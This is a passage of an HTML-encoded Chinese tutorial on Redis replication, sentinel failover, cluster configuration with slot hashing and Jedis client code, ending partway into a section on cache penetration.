<li>&#x4E3B;&#x673A;&#x5982;&#x679C;&#x5B95;&#x673A;&#xFF0C;&#x91CD;&#x542F;&#x540E;&#x81EA;&#x52A8;&#x6062;&#x590D;&#x5230;&#x4E4B;&#x524D;&#x7684;&#x8F6C;&#x6001;&#xFF0C;&#x4E0D;&#x9700;&#x8981;&#x518D;&#x505A;&#x5176;&#x4ED6;&#x4EFB;&#x4F55;&#x4FEE;&#x6539;&#xFF0C;&#x518D;&#x65B0;&#x589E;&#x52A0;&#x6570;&#x636E;&#xFF0C;&#x4ECE;&#x673A;&#x53EF;&#x4EE5;&#x8BFB;&#x5230;&#x6570;&#x636E;&#x3002;</li>
<li>&#x4ECE;&#x673A;&#x5982;&#x679C;&#x5B95;&#x673A;&#xFF0C;&#x518D;&#x6B21;&#x91CD;&#x542F;&#x540E;&#xFF0C;&#x518D;&#x6B21;&#x8BFB;&#x6570;&#x636E;&#xFF0C;&#x8BFB;&#x4E0D;&#x5230;&#x3002;&#x9700;&#x8981;&#x4F7F;&#x7528; slaveof &#x6216; replicaof &#x518D;&#x6B21;&#x58F0;&#x660E;&#x6240;&#x5C5E;&#x4E3B;&#x673A;&#xFF0C;&#x58F0;&#x660E;&#x4E4B;&#x540E;&#x53EF;&#x4EE5;&#x518D;&#x6B21;&#x8BFB;&#x53D6;&#x6570;&#x636E;&#x3002;</li>
<li>&#x4E3B;&#x673A;&#x53EF;&#x5199;&#x53EF;&#x8BFB;&#xFF0C;&#x4ECE;&#x673A;&#x53EA;&#x53EF;&#x4EE5;&#x8BFB;&#xFF0C;&#x4E0D;&#x53EF;&#x4EE5;&#x5199;&#x3002;</li>
<li>&#x4ECE;&#x673A;&#x4F7F;&#x7528; slaveof &#x6216; replicaof &#x58F0;&#x660E;&#x6240;&#x5C5E;&#x4E3B;&#x673A;&#x65F6;&#x4F1A;&#x53D1;&#x9001; sync &#x5230;&#x4E3B;&#x673A;&#xFF0C;&#x83B7;&#x53D6;&#x4E3B;&#x673A;&#x7684; rdb &#x6587;&#x4EF6;&#x5E76;&#x6267;&#x884C;&#xFF0C;&#x4EE5;&#x6B64;&#x5B9E;&#x73B0;&#x6570;&#x636E;&#x540C;&#x6B65;&#x3002;&#x540E;&#x7EED;&#x589E;&#x52A0;&#x6570;&#x636E;&#xFF0C;&#x4F7F;&#x7528;<strong>&#x589E;&#x91CF;&#x590D;&#x5236;</strong>&#x5B8C;&#x6210;&#x540C;&#x6B65;&#x3002;&#x5982;&#x679C;&#x662F;&#x5B95;&#x673A;&#x540E;&#x518D;&#x6B21;&#x58F0;&#x660E;&#x6240;&#x5C5E;&#x4E3B;&#x673A;&#xFF0C;&#x5219;&#x4F7F;&#x7528;<strong>&#x5168;&#x91CF;&#x590D;&#x5236;</strong>&#x5B8C;&#x6210;&#x540C;&#x6B65;&#x3002;</li>
</ol>
</blockquote>
<h3 id="%E8%96%AA%E7%81%AB%E7%9B%B8%E4%BC%A0">&#x85AA;&#x706B;&#x76F8;&#x4F20;</h3>
<p>&#x56E0;&#x4E3A;&#x4ECE;&#x673A;&#x53EF;&#x4EE5;&#x63A5;&#x6536;&#x6765;&#x81EA;&#x5176;&#x4ED6;&#x4ECE;&#x673A;&#x7684;&#x8FDE;&#x63A5;&#x548C;&#x540C;&#x6B65;&#x8BF7;&#x6C42;&#xFF0C;&#x90A3;&#x4E48;&#x524D;&#x4E00;&#x4E2A;&#x4ECE;&#x673A;&#x53EF;&#x4EE5;&#x662F;&#x540E;&#x4E00;&#x4E2A;&#x4ECE;&#x673A;&#x7684;&#x4E3B;&#x673A;&#x3002;&#x85AA;&#x706B;&#x76F8;&#x4F20;&#x8FD9;&#x79CD;&#x6A21;&#x5F0F;&#x53EF;&#x4EE5;&#x6709;&#x6548;&#x51CF;&#x8F7B;&#x4E3B;&#x673A;&#x7684;&#x5199;&#x538B;&#x529B;&#xFF0C;&#x901A;&#x8FC7;&#x53BB;&#x4E2D;&#x5FC3;&#x5316;&#x964D;&#x4F4E;&#x98CE;&#x9669;&#x3002;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;&#x82E5;&#x4E2D;&#x9014;&#x53D8;&#x66F4;&#x8F6C;&#x5411;&#xFF0C;&#x90A3;&#x4E48;&#x4F1A;&#x6E05;&#x9664;&#x6B64;&#x524D;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x5E76;&#x91CD;&#x65B0;&#x5EFA;&#x7ACB;&#x6700;&#x65B0;&#x7684;&#x62F7;&#x8D1D;&#x3002;&#x98CE;&#x9669;&#x5728;&#x4E8E;&#x4E00;&#x65E6;&#x67D0;&#x4E2A;&#x4ECE;&#x673A;&#x5B95;&#x673A;&#xFF0C;&#x540E;&#x8FB9;&#x7684;&#x4ECE;&#x673A;&#x90FD;&#x6CA1;&#x6CD5;&#x5907;&#x4EFD;&#x3002;&#x4E3B;&#x673A;&#x5B95;&#x673A;&#xFF0C;&#x4ECE;&#x673A;&#x8FD8;&#x662F;&#x4ECE;&#x673A;&#xFF0C;&#x53EA;&#x662F;&#x65E0;&#x6CD5;&#x5199;&#x6570;&#x636E;&#x3002;&#x8FD9;&#x79CD;&#x6A21;&#x5F0F;&#x5E38;&#x89C1;&#x4E8E;&#x9879;&#x76EE;&#x4F53;&#x91CF;&#x7684;&#x589E;&#x52A0;&#xFF0C;&#x9700;&#x8981;&#x6811;&#x72B6;&#x5206;&#x5E03;&#x7684;&#x7BA1;&#x7406;&#x3002;</p>
<h3 id="%E5%8F%8D%E5%AE%A2%E4%B8%BA%E4%B8%BB">&#x53CD;&#x5BA2;&#x4E3A;&#x4E3B;</h3>
<p>&#x53CD;&#x5BA2;&#x4E3A;&#x4E3B;&#x5373;&#x5728;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x5B95;&#x673A;&#x540E;&#xFF0C;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x5347;&#x7EA7;&#x4E3A;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x5176;&#x540E;&#x7684;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x4E0D;&#x7528;&#x505A;&#x4EFB;&#x4F55;&#x4FEE;&#x6539;&#x3002;</p>
<pre><code class="language-shell"># &#x4ECE;&#x673A;&#x6062;&#x590D;&#x4E3B;&#x673A;&#x72B6;&#x6001;
slaveof no one
</code></pre>
<h3 id="%E5%93%A8%E5%85%B5%E6%A8%A1%E5%BC%8F-sentinel"><a href="https://redis.io/docs/manual/sentinel/">&#x54E8;&#x5175;&#x6A21;&#x5F0F; sentinel</a></h3>
<p>&#x54E8;&#x5175;&#x6A21;&#x5F0F;&#x4F5C;&#x4E3A;&#x53CD;&#x5BA2;&#x4E3A;&#x4E3B;&#x7684;&#x81EA;&#x52A8;&#x7248;&#xFF0C;&#x80FD;&#x591F;&#x5728;&#x540E;&#x53F0;&#x76D1;&#x89C6;&#x4E3B;&#x673A;&#x7684;&#x6545;&#x969C;&#x4E0E;&#x5426;&#xFF0C;&#x5E76;&#x6839;&#x636E;&#x6295;&#x7968;&#x81EA;&#x52A8;&#x7684;&#x5C06;&#x4ECE;&#x673A;&#x8F6C;&#x6362;&#x4E3A;&#x4E3B;&#x673A;&#x3002;&#x5728;&#x539F;&#x4E3B;&#x673A;&#x4ECE;&#x5B95;&#x673A;&#x72B6;&#x6001;&#x6062;&#x590D;&#x540E;&#xFF0C;&#x4F1A;&#x9ED8;&#x8BA4;&#x53D8;&#x6210;&#x65B0;&#x4E3B;&#x673A;&#x7684;&#x4ECE;&#x673A;&#x3002;</p>
<p>&#x65B0;&#x4E3B;&#x673A;&#x4F1A;&#x5728;&#x4E00;&#x4F17;&#x4ECE;&#x4E3B;&#x673A;&#x4E2D;&#x4EA7;&#x751F;&#xFF0C;&#x4ECE;&#x673A;&#x7684;&#x6311;&#x9009;&#x987A;&#x5E8F;&#x662F;&#x6839;&#x636E;&#x4F18;&#x5148;&#x7EA7;&#x9760;&#x524D;&#x3001;&#x504F;&#x79FB;&#x91CF;&#x6700;&#x5927;&#x6216; runid &#x6700;&#x5C0F;&#x7684;&#x6307;&#x6807;&#x6765;&#x8FDB;&#x884C;&#x9009;&#x62E9;&#x3002;</p>
<blockquote>
<p>&#x4F18;&#x5148;&#x7EA7;&#x5728; redis.conf &#x4E2D;&#x9ED8;&#x8BA4;&#x4E3A; slave|replica-priority 100&#xFF0C;&#x503C;&#x8D8A;&#x5C0F;&#x4F18;&#x5148;&#x7EA7;&#x8D8A;&#x9AD8;&#x3002;<br>
&#x504F;&#x79FB;&#x91CF;&#x662F;&#x6307;&#x83B7;&#x5F97;&#x539F;&#x4E3B;&#x673A;&#x6570;&#x636E;&#x6700;&#x5168;&#x7684;&#x3002;<br>
&#x6BCF;&#x4E2A; redis &#x5B9E;&#x4F8B;&#x542F;&#x52A8;&#x540E;&#x90FD;&#x4F1A;&#x968F;&#x673A;&#x751F;&#x6210;&#x4E00;&#x4E2A; 40 &#x4F4D;&#x7684; runid&#x3002;</p>
</blockquote>
<p>&#x54E8;&#x5175;&#x6A21;&#x5F0F;&#x5B58;&#x5728;&#x590D;&#x5236;&#x5EF6;&#x65F6;&#x7684;&#x7F3A;&#x70B9;&#x3002;&#x56E0;&#x6240;&#x6709;&#x7684;&#x5199;&#x64CD;&#x4F5C;&#x90FD;&#x662F;&#x5148;&#x5728;&#x4E3B;&#x673A;&#xFF0C;&#x7136;&#x540E;&#x540C;&#x6B65;&#x66F4;&#x65B0;&#x5230;&#x4ECE;&#x673A;&#xFF0C;&#x540C;&#x6B65;&#x8FC7;&#x7A0B;&#x4F1A;&#x6709;&#x4E00;&#x5B9A;&#x7684;&#x5EF6;&#x8FDF;&#x3002;&#x5F53;&#x7CFB;&#x7EDF;&#x7E41;&#x5FD9;&#x65F6;&#xFF0C;&#x6216;&#x8005;&#x4ECE;&#x673A;&#x6570;&#x91CF;&#x8F83;&#x5927;&#x65F6;&#xFF0C;&#x5EF6;&#x8FDF;&#x95EE;&#x9898;&#x53EF;&#x80FD;&#x4F1A;&#x66F4;&#x52A0;&#x4E25;&#x91CD;&#x3002;</p>
<ul>
<li>&#x914D;&#x7F6E; sentinel.conf</li>
</ul>
<pre><code class="language-shell"># mymaster =&gt; &#x76D1;&#x63A7;&#x5BF9;&#x8C61;&#x8D77;&#x7684;&#x670D;&#x52A1;&#x5668;&#x540D;
# 1 =&gt; &#x81F3;&#x5C11;&#x6709;&#x4E00;&#x4E2A;&#x54E8;&#x5175;&#x540C;&#x610F;&#x8FC1;&#x79FB;&#x7684;&#x6570;&#x91CF;
sentinel monitor mymaster 127.0.0.1 6379 1
</code></pre>
<ul>
<li>&#x542F;&#x52A8;&#x54E8;&#x5175;</li>
</ul>
<p>&#x54E8;&#x5175;&#x9ED8;&#x8BA4;&#x542F;&#x52A8;&#x5728; 26379 &#x7AEF;&#x53E3;&#xFF0C;&#x5728;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x5B95;&#x673A;&#x540E;&#x4E00;&#x6BB5;&#x65F6;&#x95F4;&#x4F1A;&#x6253;&#x5370;&#x64CD;&#x4F5C;&#x65E5;&#x5FD7;&#x5E76;&#x5207;&#x6362;&#x4E1B;&#x673A;&#x4E3A;&#x4E3B;&#x673A;&#x3002;</p>
<pre><code class="language-shell">[centos myredis]# redis-sentinel  /myredis/sentinel.conf
</code></pre>
<pre><code class="language-java">private static JedisSentinelPool jedisSentinelPool=null;
public static  Jedis getJedisFromSentinel(){
    if(jedisSentinelPool==null){
        Set&lt;String&gt; sentinelSet=new HashSet&lt;&gt;();
        sentinelSet.add(&quot;remoteIp:26379&quot;);
        JedisPoolConfig jedisPoolConfig =new JedisPoolConfig();
        jedisPoolConfig.setMaxTotal(10); // &#x6700;&#x5927;&#x53EF;&#x7528;&#x8FDE;&#x63A5;&#x6570;
        jedisPoolConfig.setMaxIdle(5); // &#x6700;&#x5927;&#x95F2;&#x7F6E;&#x8FDE;&#x63A5;&#x6570;
        jedisPoolConfig.setMinIdle(5); // &#x6700;&#x5C0F;&#x95F2;&#x7F6E;&#x8FDE;&#x63A5;&#x6570;
        jedisPoolConfig.setBlockWhenExhausted(true); // &#x8FDE;&#x63A5;&#x8017;&#x5C3D;&#x662F;&#x5426;&#x7B49;&#x5F85;
        jedisPoolConfig.setMaxWaitMillis(2000); // &#x7B49;&#x5F85;&#x65F6;&#x95F4;
        jedisPoolConfig.setTestOnBorrow(true); // &#x53D6;&#x8FDE;&#x63A5;&#x7684;&#x65F6;&#x5019;&#x8FDB;&#x884C;&#x4E00;&#x4E0B;&#x6D4B;&#x8BD5; ping pong
        jedisSentinelPool=new JedisSentinelPool(&quot;mymaster&quot;,sentinelSet,jedisPoolConfig);
        return jedisSentinelPool.getResource();
        } else {
        return jedisSentinelPool.getResource();
    }
}
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E9%9B%86%E7%BE%A4">&#x96C6;&#x7FA4;</h2>
<p>&#x96C6;&#x7FA4;&#x6A21;&#x5F0F;&#x5E38;&#x7528;&#x4E8E;&#x6269;&#x5BB9;&#x4EE5;&#x53CA;&#x4E3B;&#x673A;&#x5E76;&#x53D1;&#x5199;&#x64CD;&#x4F5C;&#x538B;&#x529B;&#x7684;&#x5206;&#x644A;&#x3002;&#x5F53;&#x4E3B;&#x4ECE;&#x6A21;&#x5F0F;&#x548C;&#x85AA;&#x706B;&#x76F8;&#x4F20;&#x6A21;&#x5F0F;&#x4E2D;&#x7684;&#x4E3B;&#x673A;&#x5B95;&#x673A;&#xFF0C;&#x53EF;&#x901A;&#x8FC7;&#x65E0;&#x4E2D;&#x5FC3;&#x5316;&#x7684;&#x96C6;&#x7FA4;&#x914D;&#x7F6E;&#x89E3;&#x51B3;&#x5730;&#x5740;&#x53D8;&#x5316;&#x5BFC;&#x81F4;&#x7684;&#x914D;&#x7F6E;&#x4FEE;&#x6539;&#x95EE;&#x9898;&#x3002;&#x96C6;&#x7FA4;&#x5B9E;&#x73B0;&#x6C34;&#x5E73;&#x6269;&#x5BB9;&#xFF0C;&#x5373;&#x542F;&#x52A8;&#x591A;&#x4E2A;&#x670D;&#x52A1;&#x8282;&#x70B9;&#xFF0C;&#x5E76;&#x5C06;&#x6574;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x5206;&#x5E03;&#x5B58;&#x50A8;&#x5728;&#x8FD9;&#x4E9B;&#x8282;&#x70B9;&#xFF0C;&#x6BCF;&#x4E2A;&#x8282;&#x70B9;&#x5B58;&#x50A8;&#x603B;&#x6570;&#x636E;&#x7684; 1/N&#x3002;</p>
<p>&#x5220;&#x9664;&#x6301;&#x4E45;&#x5316;&#x6570;&#x636E; =&gt; &#x5C06; rdb&#x3001;aof &#x6587;&#x4EF6;&#x90FD;&#x5220;&#x9664;&#x6389;&#x3002;</p>
<h3 id="%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AE">&#x96C6;&#x7FA4;&#x914D;&#x7F6E;</h3>
<ul>
<li>&#x5355;&#x670D;&#x52A1;&#x5668;&#x8BBE;&#x7F6E;&#x516D;&#x9879;&#x670D;&#x52A1;&#x6A21;&#x62DF;&#x96C6;&#x7FA4;&#xFF0C;&#x64CD;&#x4F5C;&#x524D;&#x5E94;&#x5148;&#x5C06; dump.rdb &#x5220;&#x9664;&#x6392;&#x9664;&#x5E72;&#x6270;</li>
</ul>
<pre><code class="language-shell"># 9 &#x7ED3;&#x5C3E;&#x8868;&#x793A;&#x4E3B;&#x673A; 0 &#x7ED3;&#x5C3E;&#x8868;&#x793A;&#x4ECE;&#x673A;
rm -rf dump63*
</code></pre>
<ul>
<li>redis cluster &#x914D;&#x7F6E;&#x4FEE;&#x6539; =&gt; redis63xx.conf</li>
</ul>
<pre><code class="language-shell">include /home/bigdata/redis.conf
port 6379
pidfile &quot;/var/run/redis_6379.pid&quot;
dbfilename &quot;dump6379.rdb&quot;
dir &quot;/home/bigdata/redis_cluster&quot;
logfile &quot;/home/bigdata/redis_cluster/redis_err_6379.log&quot;
cluster-enabled yes # &#x6253;&#x5F00;&#x96C6;&#x7FA4;&#x6A21;&#x5F0F;
cluster-config-file nodes-6379.conf # &#x8BBE;&#x5B9A;&#x8282;&#x70B9;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x540D;
cluster-node-timeout 15000 # &#x8BBE;&#x5B9A;&#x8282;&#x70B9;&#x5931;&#x8054;&#x65F6;&#x95F4; =&gt; &#x8D85;&#x8FC7;&#x8BE5;&#x65F6;&#x95F4;&#xFF08;&#x6BEB;&#x79D2;&#xFF09;&#x96C6;&#x7FA4;&#x81EA;&#x52A8;&#x8FDB;&#x884C;&#x4E3B;&#x4ECE;&#x5207;&#x6362;
</code></pre>
<ul>
<li>&#x590D;&#x5236;&#x591A;&#x4E2A;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x5E76;&#x4FEE;&#x6539;</li>
</ul>
<pre><code class="language-shell"># &#x590D;&#x5236;&#x914D;&#x7F6E;&#x6587;&#x4EF6;
cp redis6379.conf redis63xx.conf
# &#x66FF;&#x6362;&#x5339;&#x914D;&#x5B57;&#x7B26;
:%s/6379/63xx
</code></pre>
<ul>
<li>&#x542F;&#x52A8;&#x670D;&#x52A1;|&#x5408;&#x6210;&#x96C6;&#x7FA4; =&gt; redis &#x5B9E;&#x4F8B;&#x542F;&#x52A8;&#x4E14; nodes-xxxx.conf &#x6587;&#x4EF6;&#x6B63;&#x5E38;&#x751F;&#x6210;</li>
</ul>
<pre><code class="language-shell">redis-server redis63xx.conf * 6
ps -ef | grep redis # &#x6B64;&#x65F6;&#x5E94;&#x8BE5;&#x6709; 6 &#x4E2A;&#x542F;&#x52A8;&#x7684; redis &#x9879;&#x76EE;
cd /opt/redis-7.0.2/src # &#x8FDB;&#x5165;&#x751F;&#x6210;&#x96C6;&#x7FA4;&#x7684;&#x73AF;&#x5883;
# &#x6B64;&#x5904;&#x4E0D;&#x8981;&#x7528; 127.0.0.1 &#x5E94;&#x7528;&#x771F;&#x5B9E; IP &#x5730;&#x5740;
# --replicas 1 =&gt; &#x7B80;&#x5355;&#x7684;&#x65B9;&#x5F0F;&#x914D;&#x7F6E;&#x96C6;&#x7FA4; -&gt; &#x4E00;&#x53F0;&#x4E3B;&#x673A;&#x548C;&#x4E00;&#x53F0;&#x4ECE;&#x673A; -&gt; &#x6B63;&#x597D;&#x4E09;&#x7EC4;
redis-cli --cluster create --cluster-replicas 1 xxx.xx.xx.xxx:6379 xxx.xx.xx.xxx:6380 xxx.xx.xx.xxx:6381 xxx.xx.xx.xxx:6389 xxx.xx.xx.xxx:6390 xxx.xx.xx.xxx:6391
</code></pre>
<h3 id="%E9%9B%86%E7%BE%A4%E6%93%8D%E4%BD%9C%E4%B8%8E%E6%95%85%E9%9A%9C%E6%81%A2%E5%A4%8D">&#x96C6;&#x7FA4;&#x64CD;&#x4F5C;&#x4E0E;&#x6545;&#x969C;&#x6062;&#x590D;</h3>
<ul>
<li>&#x8282;&#x70B9;&#x5206;&#x914D;</li>
</ul>
<p>&#x4E00;&#x4E2A;&#x96C6;&#x7FA4;&#x81F3;&#x5C11;&#x8981;&#x6709;&#x4E09;&#x4E2A;&#x4E3B;&#x8282;&#x70B9;&#x3002;<code>--cluster-replicas 1</code> &#x8868;&#x793A;&#x5E0C;&#x671B;&#x4E3A;&#x96C6;&#x7FA4;&#x4E2D;&#x7684;&#x6BCF;&#x4E2A;&#x4E3B;&#x8282;&#x70B9;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x4ECE;&#x8282;&#x70B9;&#x3002;&#x5206;&#x914D;&#x539F;&#x5219;&#x5C3D;&#x91CF;&#x4FDD;&#x8BC1;&#x6BCF;&#x4E2A;&#x4E3B;&#x6570;&#x636E;&#x5E93;&#x8FD0;&#x884C;&#x5728;&#x4E0D;&#x540C;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x6BCF;&#x4E2A;&#x4ECE;&#x5E93;&#x548C;&#x4E3B;&#x5E93;&#x4E0D;&#x5728;&#x4E00;&#x4E2A;&#x5730;&#x5740;&#x4E0A;&#x3002;</p>
<ul>
<li>slots &#x63D2;&#x69FD;</li>
</ul>
<p>redis &#x96C6;&#x7FA4;&#x5305;&#x542B; 16384 &#x4E2A;&#x63D2;&#x69FD;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x6BCF;&#x4E2A;&#x952E;&#x90FD;&#x5C5E;&#x4E8E;&#x8FD9;&#x4E9B;&#x63D2;&#x69FD;&#x4E2D;&#x7684;&#x5355;&#x5143;&#xFF0C;&#x516C;&#x5F0F; <code>CRC16(key) % 16384</code> &#x7528;&#x4E8E;&#x8BA1;&#x7B97;&#x952E; key &#x5C5E;&#x4E8E;&#x54EA;&#x4E2A;&#x63D2;&#x69FD;&#x3002;</p>
<p>redis &#x96C6;&#x7FA4;&#x4E2D;&#x7684;&#x6BCF;&#x4E2A;&#x8282;&#x70B9;&#x90FD;&#x8D1F;&#x8D23;&#x5904;&#x7406;&#x4E00;&#x90E8;&#x5206;&#x7684;&#x63D2;&#x69FD;&#x3002;&#x82E5;&#x96C6;&#x7FA4;&#x6709;&#x4E3B;&#x8282;&#x70B9; A&#x3001;B&#x3001;C&#xFF0C;&#x90A3;&#x4E48;&#x53EF;&#x4EE5;&#x5206;&#x914D; A &#x5904;&#x7406; 0 &#x81F3; 5460 &#x53F7;&#x63D2;&#x69FD;&#xFF1B;B &#x5904;&#x7406; 5461 &#x81F3; 10922 &#x53F7;&#x63D2;&#x69FD;&#xFF1B;C &#x5904;&#x7406;&#x4F59;&#x4E0B;&#x81F3; 16383 &#x53F7;&#x7684;&#x63D2;&#x69FD;&#x3002;</p>
<ul>
<li>&#x96C6;&#x7FA4;&#x4E2D;&#x5F55;&#x5165;&#x503C;</li>
</ul>
<pre><code class="language-shell"># &#x96C6;&#x7FA4;&#x65B9;&#x5F0F;&#x8FDE;&#x63A5;
[centos myredis]# redis-cli -c -p 6379
127.0.0.1:6379&gt; set k1 v1
-&gt; Redirected to slot [12706] located at xxx.xx.xx.xxx:6381
OK
xxx.xx.xx.xxx:6381&gt; set k2 v2
-&gt; Redirected to slot [449] located at xxx.xx.xx.xxx:6389
OK
# &#x6839;&#x636E;&#x7EC4;&#x540D;&#x8BA1;&#x7B97;&#x63D2;&#x69FD;&#x505A;&#x6DFB;&#x52A0; =&gt; &#x4F7F; key &#x4E2D; {} &#x5185;&#x76F8;&#x540C;&#x5185;&#x5BB9;&#x7684;&#x952E;&#x503C;&#x5BF9;&#x653E;&#x5230;&#x4E00;&#x4E2A; slot
xxx.xx.xx.xxx:6389&gt; mset name zs age 22 address cs
(error) CROSSSLOT Keys in request don&apos;t hash to the same slot
xxx.xx.xx.xxx:6389&gt; mset name{user} zs age{user} 22 address{user} cs
OK
</code></pre>
<ul>
<li>&#x67E5;&#x8BE2;&#x96C6;&#x7FA4;&#x4E2D;&#x7684;&#x503C;</li>
</ul>
<pre><code class="language-shell"># &#x8BA1;&#x7B97;&#x67D0;&#x952E;&#x5728;&#x54EA;&#x4E2A;&#x63D2;&#x69FD;
xxx.xx.xx.xxx:6389&gt; cluster keyslot k1
(integer) 12706 # k1 &#x63D2;&#x69FD;&#x503C;
# &#x8BA1;&#x7B97;&#x63D2;&#x69FD;&#x503C;&#x4E2D;&#x6709;&#x51E0;&#x4E2A;&#x952E;
xxx.xx.xx.xxx:6389&gt; cluster countkeysinslot 449
(integer) 1
# &#x8FD4;&#x56DE; count &#x4E2A; slot &#x69FD;&#x4E2D;&#x7684;&#x952E;
xxx.xx.xx.xxx:6389&gt; cluster getkeysinslot 5474 10
1) &quot;address{user}&quot;
2) &quot;age{user}&quot;
3) &quot;name{user}&quot;
</code></pre>
<ul>
<li>&#x6545;&#x969C;&#x6062;&#x590D;</li>
</ul>
<p>&#x4E3B;&#x8282;&#x70B9;&#x4E0B;&#x7EBF;&#x540E;&#xFF0C;&#x4ECE;&#x8282;&#x70B9;&#x4F1A;&#x81EA;&#x52A8;&#x5347;&#x4E3A;&#x4E3B;&#x8282;&#x70B9;&#x3002;&#x4E3B;&#x8282;&#x70B9;&#x4ECE;&#x5B95;&#x673A;&#x6062;&#x590D;&#x540E;&#x4F1A;&#x53D8;&#x4E3A;&#x4ECE;&#x8282;&#x70B9;&#x3002;&#x5F53;&#x67D0;&#x4E00;&#x6BB5;&#x63D2;&#x69FD;&#x7684;&#x4E3B;&#x4ECE;&#x8282;&#x70B9;&#x90FD;&#x5B95;&#x6389;&#xFF0C;&#x670D;&#x52A1;&#x4F1A;&#x6839;&#x636E;&#x914D;&#x7F6E;&#x4EA7;&#x751F;&#x5168;&#x90E8;&#x5B95;&#x673A;&#x6216;&#x53EA;&#x6709;&#x8BE5;&#x63D2;&#x69FD;&#x6570;&#x636E;&#x7F62;&#x5DE5;&#x7684;&#x4E24;&#x79CD;&#x4E0D;&#x540C;&#x60C5;&#x51B5;&#x3002;</p>
<pre><code class="language-shell"># redis.conf
cluster-require-full-coverage yes|no
</code></pre>
<ul>
<li>&#x96C6;&#x7FA4;&#x7684; Jedis &#x5F00;&#x53D1;</li>
</ul>
<pre><code class="language-java">public class JedisClusterTest {
  public static void main(String[] args) {
     // &#x521B;&#x5EFA;&#x5BF9;&#x8C61; =&gt; &#x65E0;&#x4E2D;&#x5FC3;&#x5316; -&gt; &#x653E;&#x4E00;&#x4E2A; HostAndPort &#x5373;&#x53EF;
     HostAndPort hostAndPort = new HostAndPort(&quot;xxx.xx.xx.xx&quot;,6379);
     JedisCluster jedisCluster=new JedisCluster(hostAndPort);
     jedisCluster.set(&quot;k1&quot;, &quot;v1&quot;);
     System.out.println(jedisCluster.get(&quot;k1&quot;));
     jedisCluster.close();
  }
}
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E5%BA%94%E7%94%A8%E9%97%AE%E9%A2%98">&#x5E94;&#x7528;&#x95EE;&#x9898;</h2>
<h3 id="%E7%BC%93%E5%AD%98%E7%A9%BF%E9%80%8F">&#x7F13;&#x5B58;&#x7A7F;&#x900F;</h3>
<p>&#x7F13;&#x5B58;&#x7A7F;&#x900F;&#x7684;&#x73B0;&#x8C61;&#x662F;&#x5E94;&#x7528;&#x670D;&#x52A1;&#x5668;&#x538B;&#x529B;&#x589E;&#x5927;&#xFF0C;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#x5668;&#x867D;&#x5E73;&#x7A33;&#x8FD0;&#x884C;&#x4F46;&#x547D;&#x4E2D;&#x7387;&#x4E0B;&#x964D;&#xFF0C;&#x603B;&#x662F;&#x4F1A;&#x8FDB;&#x884C;&#x6570;&#x636E;&#x5E93;&#x67E5;&#x8BE2;&#x3002;&#x901A;&#x5E38;&#x60C5;&#x51B5;&#x4E0B;&#x662F;&#x7531;&#x4E8E;&#x7F13;&#x5B58;&#x672C;&#x5C31;&#x67E5;&#x8BE2;&#x4E0D;&#x5230;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x5185;&#x5BB9;&#x6216;&#x8005;&#x51FA;&#x73B0;&#x975E;&#x6B63;&#x5E38;&#x7684;&#x5730;&#x5740;&#x8BBF;&#x95EE;&#x9020;&#x6210;&#x7684;&#x3002;&#x6BD4;&#x5982;&#x8FDE;&#x7EED;&#x8BBF;&#x95EE;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x767E;&#x5EA6;&#x6587;&#x5E93;&#x5730;&#x5740;&#x3002;</p>
<p>&#x5BF9;&#x4E8E;&#x8FD9;&#x79CD;&#x95EE;&#x9898;&#x53EF;&#x4EE5;&#x8003;&#x8651;&#x8FDB;&#x884C;&#x7A7A;&#x503C;&#x7F13;&#x5B58;&#xFF0C;&#x5373;&#x67E5;&#x8BE2;&#x8FD4;&#x56DE;&#x7684;&#x6570;&#x636E;&#x4E3A;&#x7A7A;&#x65F6;&#xFF0C;&#x4ECD;&#x7136;&#x628A;&#x8FD9;&#x4E2A;&#x7A7A;&#x7ED3;&#x679C;&#x8FDB;&#x884C;&#x7F13;&#x5B58;&#xFF0C;&#x5E76;&#x8BBE;&#x7F6E;&#x6700;&#x957F;&#x4E0D;&#x8D85;&#x8FC7;&#x4E94;&#x5206;&#x949F;&#x7684;&#x77ED;&#x8FC7;&#x671F;&#x65F6;&#x95F4;&#x3002;&#x540C;&#x65F6;&#x5EFA;&#x8BAE;&#x8BBE;&#x7F6E;&#x53EF;&#x8BBF;&#x95EE;&#x7684;&#x767D;&#x540D;&#x5355;&#xFF0C;&#x5373;&#x540D;&#x5355; Id &#x4F5C;&#x4E3A; bitmaps &#x7684;&#x504F;&#x79FB;&#x91CF;&#xFF0C;&#x6BCF;&#x6B21;&#x8BBF;&#x95EE;&#x90FD;&#x548C;&#x5176;&#x4E2D; Id &#x8FDB;&#x884C;&#x6BD4;&#x8F83;&#xFF0C;&#x82E5;&#x4E0D;&#x5728;&#x5176;&#x4E2D;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x8FDB;&#x884C;&#x62E6;&#x622A;&#xFF0C;&#x4E0D;&#x5141;&#x8BB8;&#x8BBF;&#x95EE;&#x3002;&#x5176;&#x4ED6;&#x65B9;&#x6848;&#x662F;&#x91C7;&#x7528;&#x5E03;&#x9686;&#x8FC7;&#x6EE4;&#x5668; Bloom 